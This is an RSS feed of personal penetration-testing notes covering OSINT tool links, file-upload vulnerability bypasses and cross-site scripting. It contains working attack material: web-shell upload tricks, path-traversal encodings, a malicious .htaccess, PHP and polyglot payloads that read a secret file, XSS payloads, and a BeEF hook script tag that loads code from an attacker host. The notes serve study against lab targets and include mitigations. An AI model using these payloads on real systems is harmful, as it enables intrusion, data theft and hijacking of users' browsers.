<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title></title>
        <link>undefined</link>
        <description>undefined</description>
        <lastBuildDate>Mon, 08 Aug 2022 22:44:52 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>Joplin Pages Publisher</generator>
        <item>
            <title><![CDATA[OSINT Tools]]></title>
            <guid>61e2fd3411c340ccba062ee8d585adc1</guid>
            <pubDate>Fri, 11 Mar 2022 14:22:06 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="brief">Brief</h1>
<p>OSINT (open-source intelligence) is a branch of intelligence that analyzes information about people or organizations from sources available to the public.
Britain and the United States actively used OSINT during WWII, with special units monitoring enemy broadcasts. Today, OSINT methodology is employed not only in foreign policy, but also in information security.
Cybersecurity professionals collect information from open sources to :</p>
<ul>
<li>Assess the security of an object and determine the attack surface so as to counter threats more effectively;</li>
<li>Detect data leaks;</li>
<li>Identify threats in preparation, their sources and vectors.</li>
</ul>
<h2 id="user-osint">User OSINT</h2>
<p><a title="https://github.com/WebBreacher/WhatsMyName" href="https://github.com/WebBreacher/WhatsMyName">https://github.com/WebBreacher/WhatsMyName</a>
<a title="https://namechk.com/" href="https://namechk.com/">https://namechk.com/</a>
<a title="https://whatsmyname.app/" href="https://whatsmyname.app/">https://whatsmyname.app/</a>
<a title="https://github.com/sherlock-project/sherlock" href="https://github.com/sherlock-project/sherlock">https://github.com/sherlock-project/sherlock</a>
<a title="https://github.com/khast3x/h8mail" href="https://github.com/khast3x/h8mail">https://github.com/khast3x/h8mail</a>
<a title="https://github.com/laramies/theHarvester" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p>
<h2 id="dns-osint">DNS OSINT</h2>
<p><a title="https://dnsdumpster.com/" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a>
<a title="https://securitytrails.com" href="https://securitytrails.com">https://securitytrails.com</a>
<a title="https://crt.sh" href="https://crt.sh">https://crt.sh</a>
<a title="https://www.virustotal.com/gui/home/search" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a> || Click on Relations button
<a title="https://github.com/darkoperator/dnsrecon" href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a>
<a title="https://github.com/aboul3la/Sublist3r" href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a>
<a title="https://github.com/OWASP/Amass" href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a></p>
<h2 id="web-based-host-osint">Web based Host OSINT</h2>
<p><a title="https://search.censys.io/" href="https://search.censys.io/">https://search.censys.io/</a>
<a title="https://www.shodan.io/" href="https://www.shodan.io/">https://www.shodan.io/</a>
<a title="https://archive.org/web/" href="https://archive.org/web/">https://archive.org/web/</a>
<a title="https://github.com/lanmaster53/recon-ng" href="https://github.com/lanmaster53/recon-ng">https://github.com/lanmaster53/recon-ng</a></p>
<h2 id="wi-fi-osint">Wi-Fi OSINT</h2>
<h3 id="tinycheck-httpsgithubcomkasperskylabtinycheck"><code>TinyCheck</code> | <a title="https://github.com/KasperskyLab/TinyCheck" href="https://github.com/KasperskyLab/TinyCheck">https://github.com/KasperskyLab/TinyCheck</a></h3>
<p><em>Easily capture network communications from a smartphone or any device that can be associated with a Wi-Fi access point for quick analysis.</em></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[File Upload]]></title>
            <guid>77e0f4fdbe7242de9b29550a5176f90e</guid>
            <pubDate>Sat, 01 Jan 2022 18:33:55 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="file-upload-vulnerabilities">File upload vulnerabilities</h1>
<p>See : <a title="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/" href="https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/">https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/</a></p>
<p><img src="/_resources/e629414e29954f6db3a4e3c3411374cb.png" />
<code>source :</code> <a title="https://portswigger.net/web-security/file-upload" href="https://portswigger.net/web-security/file-upload">https://portswigger.net/web-security/file-upload</a></p>
<h2 id="web-shell-upload-via-content-type-restriction-bypass">Web shell upload via Content-Type restriction bypass</h2>
<p>When uploading a php file;</p>
<div><pre class="hljs"><code><span class="hljs-comment"># Change :</span>
Content-Type: application/x-php
<span class="hljs-comment"># to</span>
Content-Type: image/jpeg</code></pre></div>
<hr />
<h2 id="web-shell-upload-via-path-traversal">Web shell upload via path traversal</h2>
<p>When uploading a php file;
You can upload the file to a different directory with lesser controls (a different directory that’s not supposed to contain user-supplied files)</p>
<div><pre class="hljs"><code>Change :
Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"secrets.php"</span>
to
Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"../secrets.php"</span>

<span class="hljs-comment"># You can encode "../" as :</span>
    %2e%2e%2f
    %252e%252e%252f
    ..%c0%af
    ..%ef%bc%8f
Then access the file with LFI;
GET /files/avatars/../secrets.php</code></pre></div>
<hr />
<h2 id="overriding-the-server-configuration">Overriding the server configuration</h2>
<p>Before uploading a php file;</p>
<ul>
<li>Servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.</li>
<li>Apache servers, for example, will load a directory-specific configuration from a file called <strong>.htaccess</strong> if one is present.</li>
</ul>
<div><pre class="hljs"><code><span class="hljs-comment"># First, upload a malicious .htaccess</span>
Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">".htaccess"</span>
Content-Type: text/plain

AddType application/x-httpd-php .l33t

<span class="hljs-comment"># Then upload the php file with .l33t extention</span>
Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"secrets.l33t"</span>
Content-Type: application/x-php

<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">'/home/carlos/secret'</span>); <span class="hljs-meta">?&gt;</span></code></pre></div>
<hr />
<h2 id="web-shell-upload-via-obfuscated-file-extension">Web shell upload via obfuscated file extension</h2>
<ul>
<li>Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a <strong>PHP</strong> file or <strong>JPG</strong> image: <strong>exploit.php.jpg</strong></li>
<li>Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: <strong>exploit.php.</strong></li>
<li>Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn’t decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: <strong>exploit%2Ephp</strong></li>
<li>Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: <strong>exploit.asp;.jpg</strong> or <strong>exploit.asp%00.jpg</strong></li>
<li>Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like <strong>xC0 x2E, xC4 xAE or xC0 xAE</strong> may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.</li>
</ul>
<hr />
<h2 id="remote-code-execution-via-polyglot-web-shell-upload">Remote code execution via polyglot web shell upload</h2>
<p>In order to upload a php file where the file verification is done on the server side (checking if it is really a IMAGE file), we can disguise a php file as an image file;</p>
<p>When uploading a php file;</p>
<div><pre class="hljs"><code><span class="hljs-comment"># You can add :</span>
    - GIF89a <span class="hljs-comment">// at the beginning of the php file or in the burp request</span>

<span class="hljs-comment"># Burp request</span>
Content-Disposition: form-data; name=<span class="hljs-string">"avatar"</span>; filename=<span class="hljs-string">"secrets.php"</span>
Content-Type: application/x-php

<span class="hljs-comment"># GIF89a at the beginning of the php command</span>
GIF89a;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">'/home/carlos/secret'</span>); <span class="hljs-meta">?&gt;</span></code></pre></div>
<p><img src="/_resources/884f5b2f02894769bc6ab8afec9042e1.png" /></p>
<p>or, Generate a polyglot payload using exiftool</p>
<div><pre class="hljs"><code>exiftool -Comment=<span class="hljs-string">"&lt;?php echo 'START ' . 
file_get_contents('/home/carlos/secret') . ' END'; ?&gt;"</span> &lt;YOUR-INPUT-IMAGE&gt;.jpg -o polyglot.php</code></pre></div>
<hr />
<h2 id="web-shell-upload-via-race-condition">Web shell upload via race condition</h2>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[XSS ]]></title>
            <guid>cadee47894b4481c9b7c0069d5ed76e3</guid>
            <pubDate>Wed, 24 Nov 2021 09:37:35 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="xss">XSS</h1>
<h2 id="brief">Brief</h2>
<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.</p>
<h3 id="types">Types</h3>
<ul>
<li><strong>Stored XSS</strong> : the injected script is permanently stored on the target servers, such as in a database, in a <strong>message</strong> forum, visitor log, <strong>comment</strong> field, etc. The victim then retrieves the malicious script from the server when it requests the stored information.</li>
<li><strong>Reflected XSS</strong> : Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser.</li>
<li><strong>DOM XSS</strong> : DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
<ul>
<li>Sending this URL to a victim :</li>
</ul>
</li>
</ul>
<div><pre class="hljs"><code>http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre></div>
<h2 id="payloads">Payloads</h2>
<p><a title="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS Cheat Sheet - PortSwigger</a>
<a title="https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt" href="https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt">XSS Payloads</a></p>
<p><strong>Examples</strong></p>
<div><pre class="hljs"><code><span class="hljs-comment">&lt;!-- put this into a form field --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>= <span class="hljs-string">q</span> <span class="hljs-attr">onError</span>=<span class="hljs-string">prompt(</span>'<span class="hljs-attr">test</span>'); /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">"hacked"</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>print()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
?redirect="/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>"<span class="hljs-attr">aa</span>")&gt;</span>
<span class="hljs-comment">&lt;!-- see also WAF BYPASS --&gt;</span></code></pre></div>
<h2 id="alert-print"><s>alert()</s> print()</h2>
<p><a title="https://portswigger.net/research/alert-is-dead-long-live-print" href="https://portswigger.net/research/alert-is-dead-long-live-print">Use print instead of alert</a></p>
<h1 id="xsser">XSSer</h1>
<p>“XSSer” is an automatic framework, which detects XSS vulnerabilities over in the web-applications and even provides up several options to exploit them.</p>
<div><pre class="hljs"><code><span class="hljs-comment"># install</span>
git <span class="hljs-built_in">clone</span> https://github.com/epsylon/xsser.git</code></pre></div>
<p><img src="/_resources/41d6c5fea74d46188c2ec945878851c2.png" /></p>
<p>Capture the browser request with burp, use request value (cookies value…) :
<img src="/_resources/b6aed2b559234212b127c078a0a4e281.png" /></p>
<div><pre class="hljs"><code><span class="hljs-comment"># Run XSSER</span>
<span class="hljs-built_in">cd</span> xsser/
python3 xsser --url <span class="hljs-string">"http://192.168.0.9/bWAPP/xss_get.php?firstname=XSS&amp;lastname=test1&amp;form=submit"</span> --cookie <span class="hljs-string">"PHPSESSID=q6t1k21lah0ois25m0b4egps85; security_level=1"</span> --auto</code></pre></div>
<h1 id="mitigations">Mitigations</h1>
<ul>
<li>Developers should implement a whitelist of allowable inputs, and if not possible then there should be some input validations and the data entered by the user must be filtered as much as possible.</li>
<li>Output encoding is the most reliable solution to combat XSS i.e. it takes up the script code and thus converts it into the plain text.</li>
<li>A WAF or a Web Application Firewall should be implemented as it somewhere protects the application from XSS attacks.</li>
<li>Use of HTTPOnly Flags on the Cookies.</li>
<li>The developers can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities</li>
</ul>
<h1 id="beef">Beef</h1>
<h2 id="install-config">Install &amp; Config</h2>
<div><pre class="hljs"><code>git <span class="hljs-built_in">clone</span> https://github.com/beefproject/beef.git
./install
nano config.yaml <span class="hljs-comment"># change username and password</span>
./beef</code></pre></div>
<h2 id="control">Control</h2>
<div><pre class="hljs"><code><span class="hljs-comment">&lt;!-- insert this into xss vulnerable field : --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://ip_hacker:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-comment">&lt;!-- use waf bypass --&gt;</span></code></pre></div>
]]></content:encoded>
        </item>
    </channel>
</rss>